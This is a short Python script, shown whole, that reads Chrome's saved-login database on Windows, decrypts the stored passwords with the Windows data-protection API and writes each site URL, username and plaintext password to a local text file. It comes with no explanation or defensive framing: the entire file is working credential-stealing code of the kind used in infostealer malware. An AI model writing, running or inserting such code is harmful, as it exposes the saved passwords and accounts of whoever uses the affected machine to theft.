import os
import sys
import sqlite3
import csv
import json
import argparse
import win32crypt


def main():
    info_list = []
    path = getpath()
    connection = sqlite3.connect(path + "Login Data")
    with connection:
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins'
        )
        for origin_url, username, password in v.fetchall():
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(password, None, None,
                                                         None, 0)[1]
                info_list.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': password
                })

    return info_list


def getpath():
    if os.name == "nt":
        PathName = os.getenv('localappdata') + \
                   '\\Google\\Chrome\\User Data\\Default\\'
    return PathName


file = open("testfile.txt", "w")

for i in main():
    file.write(str(i) + "\n")
file.close()
